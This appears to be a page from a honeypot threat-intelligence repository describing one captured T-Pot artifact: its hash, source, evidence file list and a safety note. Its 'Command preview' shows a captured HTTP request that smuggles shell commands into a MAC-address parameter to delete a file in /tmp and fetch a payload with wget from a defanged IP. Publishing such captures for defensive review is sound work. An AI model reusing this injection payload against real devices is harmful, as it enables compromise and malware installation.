# 5b59fdb5f70dffbf085cf7618c7aeaf34751c0d30aebe4f1c251db02cd4ed55f

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `5b59fdb5f70dffbf085cf7618c7aeaf34751c0d30aebe4f1c251db02cd4ed55f` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /None?writeData=true&reginfo=0&macAddress=%20001122334455%20-c%200%20;cd%20/tmp%3Brm%20-f%20.s%3Bwget%20hxxp://91[.]92
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
